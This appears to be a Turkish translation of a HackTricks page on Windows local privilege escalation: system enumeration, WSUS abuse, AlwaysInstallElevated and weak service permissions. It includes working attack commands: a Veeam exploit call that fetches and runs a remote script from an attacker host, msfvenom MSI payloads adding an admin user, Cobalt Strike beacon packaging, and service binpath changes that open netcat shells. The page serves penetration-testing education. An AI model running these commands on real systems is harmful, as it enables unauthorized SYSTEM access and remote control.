# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## İlk Windows Teorisi

### Access Tokens

**Windows Access Tokens nedir bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity levels nedir bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows'ta sistemi **enumerate etmenizi**, executable çalıştırmanızı veya hatta **aktivitelerinizi tespit etmelerini** sağlayabilecek/engelleyebilecek farklı şeyler vardır. Privilege escalation enumeration'a başlamadan önce bu **defenses** mekanizmalarının hepsini **okuyup** **enumerate** etmelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo secure-path kontrolleri atlatıldığında hiçbir prompt olmadan High IL seviyesine ulaşmak için kötüye kullanılabilir. Buradaki özel UIAccess/Admin Protection bypass iş akışına bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation, keyfi bir SYSTEM registry write (RegPwn) için kötüye kullanılabilir:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Son Windows sürümleri ayrıca, ayrıcalıklı bir yerel NTLM authentication'ın yeniden kullanılan bir SMB TCP connection üzerinden yansıtıldığı bir **SMB arbitrary-port** LPE yolu da ekledi:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows sürümünde bilinen bir vulnerability olup olmadığını kontrol edin (uygulanan patches'i de kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700’den fazla güvenlik açığı bulunur; bu da bir Windows ortamının sunduğu **devasa saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas içinde watson gömülü olarak bulunur)_

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploitlerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Env değişkenlerinde saklanmış herhangi bir credential/Juicy bilgi var mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl açacağınızı [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve scriptlerin bazı bölümleri buna dahildir. Ancak, tam yürütme ayrıntıları ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için, dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell loglarından son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Script'in yürütülmesinin tam etkinlik ve tam içerik kaydı yakalanır; böylece kodun her bloğu çalıştığı anda belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur ve forensics ile kötü amaçlı davranışın analizinde değerlidir. Tüm etkinliği yürütme anında belgeleyerek, süreç hakkında ayrıntılı içgörüler sağlanır.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için günlükleme olayları, Windows Event Viewer içinde şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görmek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http kullanılarak istenmiyorsa sistemi ele geçirebilirsiniz.

Ağda non-SSL bir WSUS güncellemesi kullanılıp kullanılmadığını cmd içinde aşağıdakini çalıştırarak kontrol ederek başlarsınız:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de şu şekilde:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Eğer şu cevaplardan biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

O zaman, **sömürülebilir.** Son registry değeri 0 ise, WSUS girdisi yok sayılacaktır.

Bu açıkları sömürmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Bunlar, SSL olmayan WSUS trafiğine 'fake' updates enjekte etmek için MiTM weaponized exploit scriptleridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Tam raporu burada okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temel olarak, bu bug'ın sömürdüğü kusur şudur:

> Local user proxy'mizi değiştirme yetkisine sahipseniz ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, böylece kendi trafiğimizi yakalamak için yerel olarak [PyWSUS](https://github.com/GoSecure/pywsus) çalıştırma ve asset üzerinde elevated user olarak code çalıştırma yetkisine de sahip oluruz.
>
> Ayrıca, WSUS servisi current user ayarlarını kullandığı için certificate store'unu da kullanır. WSUS hostname'i için self-signed bir certificate üretir ve bu certificate'ı current user'ın certificate store'una eklerseniz, hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, certificate üzerinde trust-on-first-use türü bir validation uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan certificate kullanıcı tarafından trusted ise ve doğru hostname'e sahipse, servis tarafından kabul edilir.

Bu vulnerability'yi [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla sömürebilirsiniz (bir kez liberate edildiğinde).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Birçok enterprise agent, localhost IPC surface ve privileged bir update channel açığa çıkarır. Enrollment bir attacker server'a zorlanabiliyor ve updater rogue root CA'ya veya zayıf signer checks'e güveniyorsa, local user SYSTEM service'in kuracağı malicious bir MSI teslim edebilir. Genelleştirilmiş tekniği (Netskope stAgentSvc chain – CVE-2025-0309 temelinde) burada görün:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261`, attacker-controlled messages işleyen **TCP/9401** üzerinde bir localhost service açığa çıkarır ve **NT AUTHORITY\SYSTEM** olarak arbitrary commands çalıştırılmasına izin verir.

- **Recon**: listener ve version'ı doğrulayın, örn. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: gerekli Veeam DLL'leri ile birlikte `VeeamHax.exe` gibi bir PoC'yi aynı dizine yerleştirin, ardından local socket üzerinden bir SYSTEM payload tetikleyin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Servis komutu SYSTEM olarak çalıştırır.
## KrbRelayUp

Windows **domain** ortamlarında belirli koşullar altında bir **local privilege escalation** açığı vardır. Bu koşullar, **LDAP signing** zorunlu tutulmayan ortamları, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasına izin veren self-rights sahip olmasını ve kullanıcıların domain içinde bilgisayar oluşturabilmesini içerir. Bu **gereksinimlerin** varsayılan ayarlarla karşılandığını belirtmek önemlidir.

**Exploit**'i şurada bulun: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Saldırı akışı hakkında daha fazla bilgi için şuraya bakın: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

Eğer bu 2 register etkinleştirilmişse (değer **0x1** ise), herhangi bir yetkiye sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **install** (execute) edebilir.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloadları
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Eğer bir meterpreter session'iniz varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz

### PowerUP

Mevcut dizin içinde bir Windows MSI binary oluşturmak için power-up içindeki `Write-UserAddMSI` komutunu kullanın; bu, ayrıcalıkları yükseltmek için kullanılır. Bu script, bir kullanıcı/grup ekleme istemi çıkaran önceden derlenmiş bir MSI installer yazar (bu yüzden GIU access gerekir):
```
Write-UserAddMSI
```
Sadece oluşturulan binary’yi çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Bu tool’ları kullanarak bir MSI wrapper oluşturmayı öğrenmek için bu tutorial’ı okuyun. Eğer sadece command line’ları **execute** etmek istiyorsanız bir "**.bat**" dosyasını da wrap edebileceğinizi unutmayın


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda yeni bir Windows EXE TCP payload **generate** edin
- **Visual Studio**’yu açın, **Create a new project** seçin ve arama kutusuna "installer" yazın. **Setup Wizard** project’ini seçin ve **Next**’e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir isim verin, konum için **`C:\privesc`** kullanın, **place solution and project in the same directory** seçin ve **Create**’e tıklayın.
- 4 adımın 3.’sine gelene kadar (**include** edilecek dosyaları seçme) **Next**’e tıklamaya devam edin. **Add**’e tıklayın ve az önce **generate** ettiğiniz Beacon payload’ını seçin. Ardından **Finish**’e tıklayın.
- **Solution Explorer** içinde **AlwaysPrivesc** project’ini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86**’dan **x64**’e değiştirin.
- **Author** ve **Manufacturer** gibi değiştirebileceğiniz başka properties de vardır; bunlar kurulan uygulamanın daha meşru görünmesini sağlayabilir.
- Project’e sağ tıklayın ve **View > Custom Actions** seçin.
- **Install**’a sağ tıklayın ve **Add Custom Action** seçin.
- **Application Folder** üzerine çift tıklayın, `beacon.exe` dosyanızı seçin ve **OK**’e tıklayın. Bu, installer çalıştırılır çalıştırılmaz beacon payload’ının execute edilmesini sağlayacaktır.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak, **build it**.
- Eğer `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının **installation** işlemini arka planda **execute** etmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyeti istismar etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Bu ayarlar neyin **loglandığını** belirler, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logların nereye gönderildiğini bilmek ilginçtir
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, **local Administrator passwords** yönetimi için tasarlanmıştır; domain'e bağlı bilgisayarlarda her parolanın **benzersiz, rastgeleleştirilmiş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli şekilde saklanır ve yalnızca ACL'ler üzerinden yeterli izin verilmiş kullanıcılar tarafından erişilebilir; böylece yetkiliyse local admin parolalarını görüntülemelerine izin verilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Eğer aktifse, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile birlikte Microsoft, Local Security Authority (LSA) için gelişmiş koruma sundu; bu, güvenilmeyen süreçlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engelleyerek** sistemi daha da güvenli hale getirir.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** **Windows 10**'da tanıtıldı. Amacı, bir cihazda saklanan kimlik bilgilerini pass-the-hash attacks gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbelleğe alınmış kimlik bilgileri

**Domain credentials**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının logon verileri kayıtlı bir security package tarafından doğrulandığında, kullanıcı için genellikle domain credentials oluşturulur.\
[**Önbelleğe alınmış kimlik bilgileri hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar & Gruplar

### Kullanıcıları & Grupları Listele

Üye olduğun gruplardan herhangi birinin ilginç izinleri olup olmadığını kontrol etmelisin
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **bazı ayrıcalıklı gruplara aitseniz, ayrıcalık yükseltebilirsiniz**. Ayrıcalıklı gruplar hakkında bilgi edinin ve ayrıcalıkları yükseltmek için bunları nasıl kötüye kullanacağınızı burada öğrenin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Daha fazla bilgi edinin** bir **token**ın ne olduğu hakkında bu sayfada: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
İlginç tokenları **öğrenmek** ve bunları nasıl kötüye kullanacağınızı görmek için aşağıdaki sayfayı kontrol edin:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Giriş yapmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Home klasörleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Şifre Politikası
```bash
net accounts
```
### Clipboard’ın içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan Processler

### Dosya ve Klasör İzinleri

Öncelikle, processlerin listesini çıkarırken **processin command line içinde şifre olup olmadığını kontrol edin**.\
**Çalışan bazı binary’leri üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) sömürmek için binary klasöründe yazma izinleriniz olup olmadığını kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman çalışıyor olabilecek [**electron/cef/chromium debuggers**](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) için kontrol edin, bunu yetkileri yükseltmek için kötüye kullanabilirsiniz.

**Processes binarylerinin izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Süreç ikililerinin klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump** ile sysinternals’tan çalışan bir process’in memory dump’ını oluşturabilirsiniz. FTP gibi hizmetlerde **credentials memory içinde açık metin olarak** bulunur; memory’yi dump etmeyi deneyin ve credentials’ı okuyun.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI apps

**SYSTEM olarak çalışan Applications, bir kullanıcının bir CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" üzerine tıklayın

## Services

Service Triggers, Windows’un belirli koşullar oluştuğunda bir service başlatmasına izin verir (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, vb.). SERVICE_START rights olmasa bile, çoğu zaman trigger’larını tetikleyerek privileged services başlatabilirsiniz. Enumeration ve activation tekniklerini burada görün:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servis hakkında bilgi almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her hizmet için gerekli ayrıcalık seviyesini kontrol etmek için _Sysinternals_ içindeki **accesschk** binary'sine sahip olmanız önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" herhangi bir servisi değiştirebiliyor mu diye kontrol etmeniz önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştir

Eğer bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Bunu kullanarak etkinleştirebilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1 için, `upnphost` servisinin çalışmak için `SSDPSRV`’ye bağımlı olduğunu göz önünde bulundurun**

Bu soruna **bir başka geçici çözüm** de şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

"Authenticated users" grubunun bir serviste **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir binary dosyasını değiştirmek mümkündür. Değiştirmek ve **sc** çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler üzerinden yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis binary’sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve servis yapılandırmalarını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahiplik edinmeyi ve izinlerin yeniden yapılandırılmasını sağlar.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Ayrıca servis yapılandırmalarını değiştirme yeteneğini devralır.

Bu açığın tespiti ve sömürülmesi için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries weak permissions

Bir servis **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa, ancak **düşük ayrıcalıklı kullanıcılar servis EXE’sini veya üst klasörünü değiştirebiliyorsa**, servis çoğu zaman **binary’yi değiştirip servisi yeniden başlatarak** ele geçirilebilir.

**Bir servis tarafından çalıştırılan binary’yi değiştirip değiştiremeyeceğini** ya da binary’nin bulunduğu klasörde **write permissions** olup olmadığını kontrol et ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic** kullanarak bir servis tarafından çalıştırılan tüm binary’leri (system32 içinde olmayan) bulabilir ve izinlerini **icacls** ile kontrol edebilirsin:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** de kullanabilirsiniz:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** için verilmiş tehlikeli ACL’leri arayın, özellikle hizmet yürütülebilir dosyası üzerinde veya onu içeren dizin üzerinde **`(F)`**, **`(M)`** ya da **`(W)`**. Pratik bir kötüye kullanım akışı şöyledir:

1. Hizmet hesabını ve yürütülebilir yolunu `sc qc <service_name>` ile doğrulayın.
2. `icacls <path>` ile binary’nin yazılabilir olduğunu doğrulayın.
3. Hizmet binary’sini bir payload veya geçerli bir kötü amaçlı service binary ile değiştirin.
4. Hizmeti `sc stop <service_name> && sc start <service_name>` ile yeniden başlatın (veya bir reboot / service trigger bekleyin).

Faydalı otomatik kontroller:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Eğer servis normal bir kullanıcının onu yeniden başlatmasına izin vermiyorsa, açılışta otomatik başlayıp başlamadığını, yeniden başlatan bir failure action’a sahip olup olmadığını veya onu kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Services registry modify permissions

Bir servis **registry**’sini değiştirme yetkiniz olup olmadığını kontrol etmelisiniz.\
Bir servis **registry**’si üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** için `FullControl` izinleri olup olmadığı kontrol edilmelidir. Eğer varsa, service tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** süreci tarafından bir HKLM oturum anahtarına kopyalanan kullanıcıya özel **ATConfig** anahtarları oluşturur. Bir registry **symbolic link race**, bu ayrıcalıklı yazmayı **herhangi bir HKLM path** içine yönlendirebilir ve böylece arbitrary HKLM **value write** primitive sağlar.

Ana konumlar (örnek: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` yüklü accessibility özelliklerini listeler.
